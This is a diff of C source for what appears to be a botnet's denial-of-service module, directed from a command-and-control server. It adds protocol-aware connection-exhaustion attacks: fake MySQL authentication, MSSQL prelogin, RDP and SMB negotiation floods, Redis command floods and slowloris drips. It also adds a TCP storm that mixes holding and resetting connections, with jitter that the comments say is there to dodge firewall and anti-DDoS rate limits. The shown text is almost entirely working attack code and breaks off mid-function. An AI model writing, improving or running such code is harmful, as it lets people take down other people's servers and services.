@@ -114,73 +114,60 @@ typedef struct {
 } AttackThread;
 
 /* ════════════════════════════════════════════════════════════════════════
- *  METHOD 1 — PSPE  (Port-Specific Protocol Exhaust)
+ *  METHOD 1 — PSPE  (Port-Specific Protocol Exhaust) v2
  *
- *  Port list comes from C2 (server-side scan optional):
- *    • Default: only user-set port(s) in open_ports / port_base
- *    • scan_ports=true on C2: full 1..65535 scan, open ports pushed to bots
- *  Bot does NOT full-scan — only attacks ports it was given.
- *  Protocol is guessed from port number, then abused with correct handshake.
- *
- *  Bandwidth: ~2 Mbps. VPS 1TB/month → 24/7.
+ *  Port list from C2. Depth abuse per protocol (not just hold):
+ *    MYSQL/MSSQL → fake auth / prelogin
+ *    RDP/SMB     → negotiate cookies
+ *    REDIS/MONGO → command flood
+ *    HTTP/WINRM  → partial request (slowloris)
+ *    SSH/FTP/SMTP→ banner drain + noop churn
+ *  Weighted pick: DB/RDP/SMB preferred over plain HTTP.
+ *  Dual phase: STORM (open/close) + HOLD (pool ESTABLISHED).
  * ════════════════════════════════════════════════════════════════════════ */
-#define PSPE_POOL 512
+#define PSPE_POOL   1536
+#define PSPE_STORM  72
 
-/* Protocol types auto-detected from banner */
 enum { P_NONE=0, P_SSH, P_FTP, P_SMTP, P_HTTP, P_REDIS, P_MYSQL, P_PGSQL,
        P_MONGO, P_DNS, P_NRO, P_MSSQL, P_WINRM, P_RDP, P_SMB, P_GENERIC };
 
-/* Per-protocol probe payload (sent after connect to elicit banner / start abuse) */
-typedef struct { const char *data; int len; } probe_t;
-static const probe_t PROBES[] = {
-    [P_SSH]   = {NULL, 0},              /* banner-first: server speaks first */
-    [P_FTP]   = {NULL, 0},              /* banner-first */
-    [P_SMTP]  = {NULL, 0},             /* banner-first */
-    [P_HTTP]  = {"GET / HTTP/1.1\r\nHost: x\r\nX-", 27},
-    [P_REDIS] = {"*1\r\n$4\r\nPING\r\n", 14},
-    [P_MYSQL] = {NULL, 0},             /* handshake-first */
-    [P_PGSQL] = {"\x00\x00\x00\x08\x04\xd2\x16\x2f", 8},
-    [P_MONGO] = {"\x3d\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01", 13},
-    [P_DNS]   = {"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\xff\x00\x01", 32},
-    [P_NRO]   = {"\xe5\x00\x06\x04boys\x00\x00\x00\x00\x00\x00\x00", 13},
-    [P_MSSQL] = {NULL, 0},             /* TDS handshake-first (server sends prelogin) */
-    [P_WINRM] = {"GET /wsman HTTP/1.1\r\nHost: x\r\nX-", 30},
-    [P_RDP]   = {NULL, 0},             /* RDP X.224 connection request — keep simple: hold */
-    [P_SMB]   = {NULL, 0},             /* SMB negotiate — server speaks first on 445 */
-    [P_GENERIC] = {NULL, 0},
-};
+typedef struct { int port; int proto; int weight; } open_port_t;
 
-/* Guess protocol from port number (C2 sends ports; no local banner scan) */
 static int guess_proto_port(int port) {
     switch (port) {
-    case 22:   return P_SSH;
-    case 21:   return P_FTP;
+    case 22: return P_SSH;
+    case 21: return P_FTP;
     case 25: case 587: case 465: return P_SMTP;
-    /* web — IIS/apache/nginx */
     case 80: case 81: case 8080: case 8081: case 8443: case 8888: case 9000:
     case 2053: case 2083: case 2087: case 2096: case 2095: case 8172: case 8800:
-    case 32400: return P_HTTP;
-    case 443: case 9443: return P_HTTP;   /* HTTPS — proto=HTTP (TLS handled elsewhere) */
-    /* db */
-    case 6379: return P_REDIS;
-    case 3306: return P_MYSQL;
+    case 32400: case 443: case 9443: return P_HTTP;
+    case 6379: case 6380: return P_REDIS;
+    case 3306: case 3307: case 33060: return P_MYSQL;
     case 5432: return P_PGSQL;
-    case 27017: return P_MONGO;
-    case 1433: case 1434: return P_MSSQL;   /* Windows game DB */
-    /* dns */
-    case 53:   return P_DNS;
-    /* remote — Windows + Linux */
-    case 3389: return P_RDP;        /* Windows RDP */
-    case 5985: case 5986: return P_WINRM;  /* Windows Remote Management */
-    case 445: case 139: return P_SMB;      /* Windows SMB */
-    /* game */
-    case 14443: case 14444: return P_NRO;
-    default:    return P_GENERIC;
+    case 27017: case 27018: return P_MONGO;
+    case 1433: case 1434: return P_MSSQL;
+    case 53: return P_DNS;
+    case 3389: return P_RDP;
+    case 5985: case 5986: return P_WINRM;
+    case 445: case 139: return P_SMB;
+    case 14443: case 14444: case 25565: case 30120: case 7777: return P_NRO;
+    default: return P_GENERIC;
     }
 }
 
-/* Port list comes from C2 (open_ports CSV). No local full-scan. */
-typedef struct { int port; int proto; } open_port_t;
+/* Higher weight = more connections aimed here (DB/RDP kill game storage harder) */
+static int proto_weight(int proto) {
+    switch (proto) {
+    case P_MYSQL: case P_MSSQL: return 12;
+    case P_RDP: case P_SMB: return 10;
+    case P_REDIS: case P_MONGO: case P_PGSQL: return 9;
+    case P_NRO: return 8;
+    case P_SSH: case P_WINRM: return 6;
+    case P_HTTP: return 4;
+    case P_FTP: case P_SMTP: return 3;
+    default: return 2;
+    }
+}
 
 static const char *proto_name(int p) {
     static const char *names[] = {
@@ -191,7 +178,6 @@ static const char *proto_name(int p) {
     return names[p];
 }
 
-/* Parse "80,443,3389" → open_port_t array. Always includes port_base. */
 static int parse_open_ports(const char *csv, int port_base, open_port_t **out) {
     int cap = 64;
     open_port_t *res = calloc((size_t)cap, sizeof(open_port_t));
@@ -204,10 +190,7 @@ static int parse_open_ports(const char *csv, int port_base, open_port_t **out) {
             while (*p == ' ' || *p == ',') p++;
             if (!*p) break;
             int port = 0;
-            while (*p >= '0' && *p <= '9') {
-                port = port * 10 + (*p - '0');
-                p++;
-            }
+            while (*p >= '0' && *p <= '9') { port = port * 10 + (*p - '0'); p++; }
             if (port > 0 && port < 65536) {
                 int dup = 0;
                 for (int i = 0; i < n; i++) if (res[i].port == port) { dup = 1; break; }
@@ -220,36 +203,296 @@ static int parse_open_ports(const char *csv, int port_base, open_port_t **out) {
                     }
                     res[n].port = port;
                     res[n].proto = guess_proto_port(port);
+                    res[n].weight = proto_weight(res[n].proto);
                     n++;
                 }
             }
             while (*p && *p != ',') p++;
         }
     }
-    /* Always ensure port_base is present */
     if (port_base > 0 && port_base < 65536) {
         int dup = 0;
         for (int i = 0; i < n; i++) if (res[i].port == port_base) { dup = 1; break; }
         if (!dup) {
             if (n >= cap) {
                 open_port_t *nr = realloc(res, (size_t)(cap + 4) * sizeof(open_port_t));
-                if (!nr) { /* keep existing list without port_base if OOM */ }
-                else { res = nr; cap += 4; }
+                if (nr) { res = nr; cap += 4; }
             }
             if (n < cap) {
                 res[n].port = port_base;
                 res[n].proto = guess_proto_port(port_base);
+                res[n].weight = proto_weight(res[n].proto);
                 n++;
             }
         }
     }
-    if (n == 0) {
-        free(res);
-        *out = NULL;
-        return 0;
-    }
+    if (n == 0) { free(res); *out = NULL; return 0; }
     *out = res;
     return n;
+}
+
+static int pick_weighted(const open_port_t *open, int n, unsigned int *seed) {
+    int total = 0;
+    for (int i = 0; i < n; i++) total += open[i].weight > 0 ? open[i].weight : 1;
+    if (total <= 0) return (int)(rs(seed) % (unsigned)n);
+    int r = (int)(rs(seed) % (unsigned)total);
+    for (int i = 0; i < n; i++) {
+        r -= open[i].weight > 0 ? open[i].weight : 1;
+        if (r < 0) return i;
+    }
+    return n - 1;
+}
+
+/* Minimal MySQL HandshakeResponse41 (no password needed — still burns auth path) */
+static int pspe_mysql_auth(unsigned char *out, int cap, unsigned int *seed) {
+    if (cap < 128) return 0;
+    unsigned char body[160];
+    int o = 0;
+    unsigned int caps = 0x000FA68D;
+    body[o++] = (unsigned char)(caps); body[o++] = (unsigned char)(caps >> 8);
+    body[o++] = (unsigned char)(caps >> 16); body[o++] = (unsigned char)(caps >> 24);
+    body[o++] = 0; body[o++] = 0; body[o++] = 0; body[o++] = 1;
+    body[o++] = 0x21;
+    for (int i = 0; i < 23; i++) body[o++] = 0;
+    char user[24];
+    snprintf(user, sizeof(user), "u%u", rs(seed) % 999999u);
+    int ul = (int)strlen(user);
+    memcpy(body + o, user, (size_t)ul); o += ul; body[o++] = 0;
+    body[o++] = 20;
+    for (int i = 0; i < 20; i++) body[o++] = (unsigned char)(rs(seed) & 0xFF);
+    const char *plug = "mysql_native_password";
+    int pl = (int)strlen(plug);
+    memcpy(body + o, plug, (size_t)pl); o += pl; body[o++] = 0;
+    if (o + 4 > cap) return 0;
+    out[0] = (unsigned char)(o & 0xFF);
+    out[1] = (unsigned char)((o >> 8) & 0xFF);
+    out[2] = 0; out[3] = 1;
+    memcpy(out + 4, body, (size_t)o);
+    return o + 4;
+}
+
+/* After TCP connect: protocol-depth abuse. Returns 1 if socket should be held. */
+static int pspe_on_connect(int s, int proto, unsigned int *seed) {
+    char buf[512];
+    int hold = 1;
+
+    switch (proto) {
+    case P_MYSQL: {
+        int gr = (int)recv(s, buf, sizeof(buf), 0);
+        if (gr > 0) pkt_sent(gr);
+        unsigned char auth[256];
+        int al = pspe_mysql_auth(auth, (int)sizeof(auth), seed);
+        if (al > 0) {
+            int wr = (int)send(s, auth, al, MSG_NOSIGNAL);
+            if (wr > 0) pkt_sent(wr);
+        }
+        /* 40% churn (reconnect storm), 60% hold (max_connections) */
+        hold = (rs(seed) % 10) < 6;
+        break;
+    }
+    case P_MSSQL: {
+        /* TDS PRELOGIN (type 0x12) minimal */
+        static const unsigned char prelogin[] = {
+            0x12, 0x01, 0x00, 0x2F, 0x00, 0x00, 0x01, 0x00,
+            0x00, 0x00, 0x1A, 0x00, 0x06, 0x01, 0x00, 0x20,
+            0x00, 0x01, 0x02, 0x00, 0x21, 0x00, 0x01, 0x03,
+            0x00, 0x22, 0x00, 0x04, 0x04, 0x00, 0x26, 0x00,
+            0x01, 0xFF, 0x09, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x01, 0x00, 0xB8, 0x0D, 0x00, 0x00, 0x01
+        };
+        int wr = (int)send(s, prelogin, (int)sizeof(prelogin), MSG_NOSIGNAL);
+        if (wr > 0) pkt_sent(wr);
+        int gr = (int)recv(s, buf, sizeof(buf), 0);
+        if (gr > 0) pkt_sent(gr);
+        hold = (rs(seed) % 10) < 7;
+        break;
+    }
+    case P_RDP: {
+        /* X.224 Connection Request (Cookie: mstshash=) */
+        static const unsigned char x224[] = {
+            0x03, 0x00, 0x00, 0x2B, 0x26, 0xE0, 0x00, 0x00, 0x00, 0x00, 0x00,
+            'C','o','o','k','i','e',':',' ','m','s','t','s','h','a','s','h','=',
+            'b','o','t','\r','\n','\r','\n'
+        };
+        int wr = (int)send(s, x224, (int)sizeof(x224), MSG_NOSIGNAL);
+        if (wr > 0) pkt_sent(wr);
+        int gr = (int)recv(s, buf, sizeof(buf), 0);
+        if (gr > 0) pkt_sent(gr);
+        hold = 1;
+        break;
+    }
+    case P_SMB: {
+        /* SMB1 Negotiate Protocol Request (NetBIOS session) */
+        static const unsigned char smb_neg[] = {
+            0x00, 0x00, 0x00, 0x54, 0xFF, 0x53, 0x4D, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00,
+            0x18, 0x53, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x31, 0x00,
+            0x02, 0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4C,
+            0x4D, 0x31, 0x2E, 0x32, 0x58, 0x30, 0x30, 0x32, 0x00, 0x02, 0x4E, 0x54, 0x20,
+            0x4C, 0x41, 0x4E, 0x4D, 0x41, 0x4E, 0x20, 0x31, 0x2E, 0x30, 0x00, 0x02, 0x4E,
+            0x54, 0x20, 0x4C, 0x4D, 0x20, 0x30, 0x2E, 0x31, 0x32, 0x00
+        };
+        int wr = (int)send(s, smb_neg, (int)sizeof(smb_neg), MSG_NOSIGNAL);
+        if (wr > 0) pkt_sent(wr);
+        int gr = (int)recv(s, buf, sizeof(buf), 0);
+        if (gr > 0) pkt_sent(gr);
+        hold = 1;
+        break;
+    }
+    case P_REDIS: {
+        const char *cmds[] = {
+            "*1\r\n$4\r\nPING\r\n",
+            "*2\r\n$4\r\nAUTH\r\n$4\r\nxbot\r\n",
+            "*3\r\n$3\r\nSET\r\n$4\r\nkbot\r\n$4\r\nvbot\r\n",
+            "*1\r\n$4\r\nINFO\r\n",
+        };
+        for (int i = 0; i < 4; i++) {
+            const char *c = cmds[rs(seed) % 4];
+            int wr = (int)send(s, c, (int)strlen(c), MSG_NOSIGNAL);
+            if (wr > 0) pkt_sent(wr);
+        }
+        hold = (rs(seed) % 10) < 5;
+        break;
+    }
+    case P_MONGO: {
+        /* OP_QUERY isMaster */
+        static const unsigned char ism[] = {
+            0x3a,0x00,0x00,0x00, 0x01,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
+            0xd4,0x07,0x00,0x00, 0x00,0x00,0x00,0x00,
+            0x61,0x64,0x6d,0x69,0x6e,0x2e,0x24,0x63,0x6d,0x64,0x00,
+            0x00,0x00,0x00,0x00, 0xff,0xff,0xff,0xff,
+            0x13,0x00,0x00,0x00, 0x10,0x69,0x73,0x6d,0x61,0x73,0x74,0x65,0x72,0x00,
+            0x01,0x00,0x00,0x00, 0x00
+        };
+        int wr = (int)send(s, ism, (int)sizeof(ism), MSG_NOSIGNAL);
+        if (wr > 0) pkt_sent(wr);
+        hold = (rs(seed) % 10) < 5;
+        break;
+    }
+    case P_PGSQL: {
+        /* StartupMessage: int32 len | int32 196608 | key\0 val\0 ... \0 */
+        unsigned char st[96];
+        int o = 4;
+        st[o++] = 0; st[o++] = 3; st[o++] = 0; st[o++] = 0; /* protocol 3.0 */
+        memcpy(st + o, "user", 5); o += 5;
+        memcpy(st + o, "bot", 4); o += 4;
+        memcpy(st + o, "database", 9); o += 9;
+        memcpy(st + o, "postgres", 9); o += 9;
+        st[o++] = 0;
+        st[0] = (unsigned char)((o >> 24) & 0xFF);
+        st[1] = (unsigned char)((o >> 16) & 0xFF);
+        st[2] = (unsigned char)((o >> 8) & 0xFF);
+        st[3] = (unsigned char)(o & 0xFF);
+        int wr = (int)send(s, st, o, MSG_NOSIGNAL);
+        if (wr > 0) pkt_sent(wr);
+        hold = 1;
+        break;
+    }
+    case P_HTTP:
+    case P_WINRM: {
+        const char *host = "x";
+        char req[256];
+        const char *path = (proto == P_WINRM) ? "/wsman" : "/";
+        int rl = snprintf(req, sizeof(req),
+            "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\n"
+            "Accept: */*\r\nConnection: keep-alive\r\nX-", path, host);
+        int wr = (int)send(s, req, rl, MSG_NOSIGNAL);
+        if (wr > 0) pkt_sent(wr);
+        hold = 1; /* slowloris drip later */
+        break;
+    }
+    case P_SSH:
+    case P_FTP:
+    case P_SMTP: {
+        int gr = (int)recv(s, buf, sizeof(buf), 0);
+        if (gr > 0) pkt_sent(gr);
+        if (proto == P_SSH) {
+            const char *cli = "SSH-2.0-OpenSSH_bot\r\n";
+            int wr = (int)send(s, cli, (int)strlen(cli), MSG_NOSIGNAL);
+            if (wr > 0) pkt_sent(wr);
+        } else if (proto == P_FTP) {
+            const char *u = "USER anonymous\r\n";
+            int wr = (int)send(s, u, (int)strlen(u), MSG_NOSIGNAL);
+            if (wr > 0) pkt_sent(wr);
+        } else {
+            const char *e = "EHLO bot.local\r\n";
+            int wr = (int)send(s, e, (int)strlen(e), MSG_NOSIGNAL);
+            if (wr > 0) pkt_sent(wr);
+        }
+        hold = 1;
+        break;
+    }
+    case P_NRO: {
+        unsigned char hs[] = {
+            0xE5, 0x00, 0x06, 0x04, 'b','o','y','s',
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+        };
+        int wr = (int)send(s, hs, (int)sizeof(hs), MSG_NOSIGNAL);
+        if (wr > 0) pkt_sent(wr);
+        hold = 1;
+        break;
+    }
+    case P_DNS: {
+        /* TCP DNS: 2-byte length + ANY query */
+        static const unsigned char q[] = {
+            0x00, 0x1e,
+            0xaa, 0xaa, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x03, 'w','w','w', 0x07, 'e','x','a','m','p','l','e', 0x03, 'c','o','m',
+            0x00, 0x00, 0xff, 0x00, 0x01
+        };
+        int wr = (int)send(s, q, (int)sizeof(q), MSG_NOSIGNAL);
+        if (wr > 0) pkt_sent(wr);
+        hold = 0; /* DNS usually one-shot */
+        break;
+    }
+    default: {
+        char z = (char)(rs(seed) & 0xFF);
+        send(s, &z, 1, MSG_NOSIGNAL);
+        pkt_sent(1);
+        hold = 1;
+        break;
+    }
+    }
+    return hold;
+}
+
+static int pspe_drip(int s, int proto, unsigned int *seed) {
+    int wr = -1;
+    switch (proto) {
+    case P_MYSQL: {
+        unsigned char ping[5] = {0x01, 0x00, 0x00, 0x00, 0x0e}; /* COM_PING */
+        wr = (int)send(s, ping, 5, MSG_NOSIGNAL);
+        break;
+    }
+    case P_REDIS: {
+        const char *c = "*1\r\n$4\r\nPING\r\n";
+        wr = (int)send(s, c, 14, MSG_NOSIGNAL);
+        break;
+    }
+    case P_HTTP: case P_WINRM: {
+        char drip[48];
+        int n = snprintf(drip, sizeof(drip), "X-%x: %x\r\n", rs(seed) & 0xFFF, rs(seed) & 0xFFF);
+        wr = (int)send(s, drip, n, MSG_NOSIGNAL);
+        break;
+    }
+    case P_MSSQL: {
+        /* TDS attention / noop-ish small packet */
+        unsigned char att[] = {0x06, 0x01, 0x00, 0x08, 0x00, 0x00, 0x01, 0x00};
+        wr = (int)send(s, att, 8, MSG_NOSIGNAL);
+        break;
+    }
+    case P_NRO: {
+        unsigned char hs[] = {0xE5, 0x00, 0x06, 0x04, 'b','o','y','s', 0,0,0,0,0,0,0};
+        wr = (int)send(s, hs, (int)sizeof(hs), MSG_NOSIGNAL);
+        break;
+    }
+    default: {
+        const char *noop = "\r\n";
+        wr = (int)send(s, noop, 2, MSG_NOSIGNAL);
+        break;
+    }
+    }
+    return wr;
 }
 
 static void *pspe_worker(void *arg) {
@@ -261,7 +504,6 @@ static void *pspe_worker(void *arg) {
     unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
     time_t start = time(NULL);
 
-    /* Port list from C2 (scan optional on server). No local full-scan. */
     open_port_t *open = NULL;
     int n_open = parse_open_ports(mt->open_ports, mt->port_base, &open);
     if (n_open == 0 || !open) {
@@ -269,27 +511,34 @@ static void *pspe_worker(void *arg) {
         return NULL;
     }
     if (mt->worker_id == 0) {
-        fprintf(stderr, "[atk] PSPE: %d port(s) on %s:", n_open, mt->host);
+        fprintf(stderr, "[atk] PSPE v2: %d port(s) on %s:", n_open, mt->host);
         for (int i = 0; i < n_open && i < 16; i++)
-            fprintf(stderr, " %d/%s", open[i].port, proto_name(open[i].proto));
+            fprintf(stderr, " %d/%s(w%d)", open[i].port, proto_name(open[i].proto), open[i].weight);
         if (n_open > 16) fprintf(stderr, " ...");
         fprintf(stderr, "\n");
     }
 
     int *socks = calloc(PSPE_POOL, sizeof(int));
-    int *pidx  = calloc(PSPE_POOL, sizeof(int));   /* index into open[] */
+    int *pidx  = calloc(PSPE_POOL, sizeof(int));
     time_t *last_drip = calloc(PSPE_POOL, sizeof(time_t));
-    if (!socks || !pidx || !last_drip) { free(socks); free(pidx); free(last_drip); free(open); return NULL; }
-
+    if (!socks || !pidx || !last_drip) {
+        free(socks); free(pidx); free(last_drip); free(open);
+        return NULL;
+    }
     int pool = 0;
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
 
-        /* Fill pool: connect to a random open port, send its protocol bytes */
-        while (pool < PSPE_POOL && !is_attack_stop()) {
-            int oi = rs(&seed) % n_open;
+        /* FW-aware: jitter + rotate focus port every few seconds */
+        int focus = (int)((time(NULL) - start) / 5) % n_open;
+
+        for (int n = 0; n < PSPE_STORM && !is_attack_stop(); n++) {
+            /* 50% weighted random, 50% focus current high-value port */
+            int oi = ((rs(&seed) & 1) || n_open == 1)
+                ? pick_weighted(open, n_open, &seed)
+                : focus;
             int port = open[oi].port;
             int proto = open[oi].proto;
             struct sockaddr_in ta = mt->target;
@@ -300,66 +549,53 @@ static void *pspe_worker(void *arg) {
             int one = 1;
             setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
             setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
-            struct timeval tv = {30, 0};
+            struct timeval tv = {4, 0};
             setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-            if (tcp_connect_wait(s, &ta, 1500) < 0) { close(s); continue; }
+            setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+            if ((rs(&seed) & 3) == 0) usleep((rs(&seed) % 2500) + 1);
+            if (tcp_connect_wait(s, &ta, 800) < 0) { close(s); continue; }
 
-            /* send protocol probe if this proto has one */
-            const probe_t *pr = &PROBES[proto];
-            if (pr->len > 0) {
-                send(s, pr->data, pr->len, MSG_NOSIGNAL);
-                pkt_sent(pr->len);
-            } else if (proto == P_GENERIC) {
-                /* unknown proto: send 1 byte to hold connection */
-                char z = (char)(rs(&seed) & 0xFF);
-                send(s, &z, 1, MSG_NOSIGNAL);
-                pkt_sent(1);
+            int hold = pspe_on_connect(s, proto, &seed);
+            /* under pressure: prefer hold for DB/RDP, RST churn for HTTP */
+            if (proto == P_HTTP || proto == P_GENERIC)
+                hold = hold && ((rs(&seed) % 10) < 4);
+            if (hold && pool < PSPE_POOL) {
+                socks[pool] = s;
+                pidx[pool] = oi;
+                last_drip[pool] = time(NULL);
+                pool++;
             } else {
-                /* banner-first proto (SSH/FTP/SMTP/MySQL): do nothing, just hold */
-                pkt_sent(1);
+                struct linger lg = {1, 0};
+                setsockopt(s, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
+                close(s);
             }
-            socks[pool] = s; pidx[pool] = oi; last_drip[pool] = time(NULL);
-            pool++;
         }
 
-        /* Drip: keep connections alive with small protocol-valid bytes */
         time_t now = time(NULL);
         for (int i = 0; i < pool && !is_attack_stop(); i++) {
             if (socks[i] < 0) continue;
-            int interval = 3 + (int)(rs(&seed) % 10);
+            int interval = 1 + (int)(rs(&seed) % 5);
             if (now - last_drip[i] >= interval) {
                 int proto = open[pidx[i]].proto;
-                const probe_t *pr = &PROBES[proto];
-                int wr = -1;
-                if (pr->len > 0) {
-                    wr = (int)send(socks[i], pr->data, pr->len, MSG_NOSIGNAL);
-                } else if (proto == P_GENERIC) {
-                    char z = (char)(rs(&seed) & 0xFF);
-                    wr = (int)send(socks[i], &z, 1, MSG_NOSIGNAL);
-                } else {
-                    /* banner-first: send newline or noop to keep alive */
-                    const char *noop = "\r\n";
-                    wr = (int)send(socks[i], noop, 2, MSG_NOSIGNAL);
-                }
+                int wr = pspe_drip(socks[i], proto, &seed);
                 if (wr <= 0) { close(socks[i]); socks[i] = -1; }
                 else { pkt_sent(wr); last_drip[i] = now; }
             }
         }
 
-        /* Reap dead */
-        struct pollfd pfds[PSPE_POOL];
-        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR|POLLHUP; }
-        if (poll(pfds, (nfds_t)pool, 100) > 0) {
-            int w = 0;
-            for (int i = 0; i < pool; i++) {
-                if (pfds[i].revents & (POLLERR|POLLHUP)) close(socks[i]);
-                else {
-                    if (w != i) { socks[w]=socks[i]; pidx[w]=pidx[i]; last_drip[w]=last_drip[i]; }
-                    w++;
-                }
+        /* Compact */
+        int w = 0;
+        for (int i = 0; i < pool; i++) {
+            if (socks[i] < 0) continue;
+            struct pollfd pfd = { .fd = socks[i], .events = POLLERR | POLLHUP };
+            if (poll(&pfd, 1, 0) > 0 && (pfd.revents & (POLLERR | POLLHUP)))
+                close(socks[i]);
+            else {
+                if (w != i) { socks[w] = socks[i]; pidx[w] = pidx[i]; last_drip[w] = last_drip[i]; }
+                w++;
             }
-            pool = w;
         }
+        pool = w;
         sched_yield();
     }
 
@@ -369,18 +605,22 @@ static void *pspe_worker(void *arg) {
 }
 
 /* ════════════════════════════════════════════════════════════════════════
- *  METHOD 2 — TCP  (TCP connect storm + hold)
+ *  METHOD 2 — TCP v3  (firewall-aware: burst / hold / RST hybrid)
  *
- *  Bypass anti-DDoS:
- *    • Opens real TCP connections → bypasses SYN-cookie mitigation
- *      (server completes handshake, allocates full connection state)
- *    • Holds connections ESTABLISHED with periodic 1-byte pokes
- *      → exhausts accept backlog + per-conn memory + conntrack table
- *    • Works on ANY TCP port (SSH, game, web, db...) — not just HTTP
- *    • Phase A storm (open fast) + Phase B hold (keep alive) cycle
- *    • No root, no spoofing needed → works on GitHub Runner / shared VPS
+ *  Small/medium FW often rate-limits new SYN per IP. Countermeasures:
+ *    • BURST: open many, RST close (SO_LINGER=0) → burn conntrack + backlog
+ *    • HOLD: keep ESTABLISHED with random-interval pokes (looks less like flood)
+ *    • SLOW: jitter between connects (avoid "N conn/sec" tripwire)
+ *    • Multi-port from open_ports when C2 provides list
+ *    • Partial payload after connect (not just 1 byte)
  * ════════════════════════════════════════════════════════════════════════ */
-#define TCP_CONN_POOL  1024
+#define TCP_CONN_POOL  2048
+#define TCP_STORM      96
+
+static void tcp_set_linger_rst(int fd) {
+    struct linger lg = { .l_onoff = 1, .l_linger = 0 };
+    setsockopt(fd, SOL_SOCKET, SO_LINGER, &lg, sizeof(lg));
+}
 
 static void *tcp_worker(void *arg) {
     AttackThread *mt = (AttackThread *)arg;
@@ -391,51 +631,121 @@ static void *tcp_worker(void *arg) {
     unsigned int seed = (unsigned)time(NULL) ^ (unsigned)(uintptr_t)pthread_self();
     time_t start = time(NULL);
 
+    int ports[64];
+    int nports = 0;
+    if (mt->open_ports[0]) {
+        const char *p = mt->open_ports;
+        while (*p && nports < 64) {
+            while (*p == ' ' || *p == ',') p++;
+            int v = 0;
+            while (*p >= '0' && *p <= '9') { v = v * 10 + (*p - '0'); p++; }
+            if (v > 0 && v < 65536) ports[nports++] = v;
+            while (*p && *p != ',') p++;
+            if (*p == ',') p++;
+        }
+    }
+    if (nports == 0) {
+        ports[0] = mt->port_base > 0 ? mt->port_base : 80;
+        nports = 1;
+    }
+
     int *cpool = calloc(TCP_CONN_POOL, sizeof(int));
     if (!cpool) return NULL;
     int pool = 0;
+    int phase = 0; /* rotate burst/hold every ~3s */
 
-    struct sockaddr_in ta = mt->target;
-    ta.sin_port = htons((uint16_t)mt->port_base);
+    if (mt->worker_id == 0)
+        fprintf(stderr, "[atk] TCP v3 → %s (%d ports, burst+hold+RST)\n", mt->host, nports);
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
 
-        /* Phase A: connect storm — open as many TCP as possible */
-        for (int s = 0; s < 64 && pool < TCP_CONN_POOL && !is_attack_stop(); s++) {
+        phase = (int)((time(NULL) - start) / 3) % 3;
+
+        /* Phase 0 BURST: connect + partial data + RST (churn conntrack) */
+        /* Phase 1 HOLD: fill pool and keep alive */
+        /* Phase 2 MIX: half hold half RST */
+        int storm = TCP_STORM;
+        for (int s = 0; s < storm && !is_attack_stop(); s++) {
+            int port = ports[rs(&seed) % (unsigned)nports];
+            struct sockaddr_in ta = mt->target;
+            ta.sin_port = htons((uint16_t)port);
+
             int fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (fd < 0) break;
             int one = 1;
             setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
             setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
-            struct timeval tv = {3,0};
+#ifdef TCP_KEEPIDLE
+            int kidle = 15, kintvl = 5, kcnt = 3;
+            setsockopt(fd, IPPROTO_TCP, TCP_KEEPIDLE, &kidle, sizeof(kidle));
+            setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &kintvl, sizeof(kintvl));
+            setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &kcnt, sizeof(kcnt));
+#endif
+            struct timeval tv = {2, 0};
             setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
             setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
-            if (tcp_connect_wait(fd, &ta, 600) < 0) { close(fd); continue; }
-            /* send 1 byte to keep it ESTABLISHED (not just SYN-RECV) */
-            char z = (char)(rs(&seed) & 0xFF);
-            if (send(fd, &z, 1, MSG_NOSIGNAL) <= 0) { close(fd); continue; }
-            cpool[pool++] = fd;
-            pkt_sent(64);   /* ≈ 1 SYN+ACK+ACK + 1 data packet */
+
+            /* jitter 0–3ms to dodge simple rate signatures */
+            if ((rs(&seed) & 3) == 0) usleep((rs(&seed) % 3000) + 1);
+
+            if (tcp_connect_wait(fd, &ta, 500) < 0) { close(fd); continue; }
+
+            /* partial payload — looks like real app traffic */
+            char buf[128];
+            int bl = 8 + (int)(rs(&seed) % 48);
+            for (int i = 0; i < bl; i++) buf[i] = (char)(rs(&seed) & 0xFF);
+            if (send(fd, buf, bl, MSG_NOSIGNAL) <= 0) {
+                tcp_set_linger_rst(fd);
+                close(fd);
+                continue;
+            }
+            pkt_sent(64 + bl);
+
+            int do_hold = 0;
+            if (phase == 1) do_hold = 1;
+            else if (phase == 2) do_hold = (rs(&seed) & 1);
+            else do_hold = (rs(&seed) % 10) < 3; /* burst: mostly RST */
+
+            if (do_hold && pool < TCP_CONN_POOL) {
+                cpool[pool++] = fd;
+            } else {
